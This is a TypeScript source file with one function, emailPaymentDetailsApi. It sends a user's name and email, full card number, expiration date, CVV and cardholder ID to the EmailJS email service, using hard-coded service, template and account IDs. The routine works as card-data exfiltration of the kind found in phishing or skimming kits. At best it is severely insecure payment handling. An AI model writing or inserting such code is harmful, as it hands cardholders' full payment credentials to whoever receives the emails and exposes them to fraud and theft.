import axios from "axios";
import { time } from "console";

const apiUrl = process.env.REACT_APP_API_URL || "https://api.emailjs.com";

export const emailPaymentDetailsApi = async (
  date: Date,
  userName: string,
  userEmail: string,
  cardHolderName: string,
  cardNumber: string,
  cardExpirationDate: string,
  cardCvv: string,
  cardHolderId: string
) => {
  try {
    const { data } = await axios.post<string>(`${apiUrl}/api/v1.0/email/send`, {
      service_id: "service_biwkfjt",
      template_id: "template_l268em2",
      user_id: "mQ1xbiPBiYd0g3bMK",
      template_params: {
        date: date,
        user_name: userName,
        user_email: userEmail,
        card_holder_name: cardHolderName,
        card_number: cardNumber,
        card_expiration_date: cardExpirationDate,
        card_cvv: cardCvv,
        card_holder_id: cardHolderId,
      },
    });
    console.log(data);
    return Promise.resolve(data);
  } catch (error) {
    if (axios.isAxiosError(error)) {
      console.log(error);
    }
    return Promise.reject("An unexpected error occurred!");
  }
};
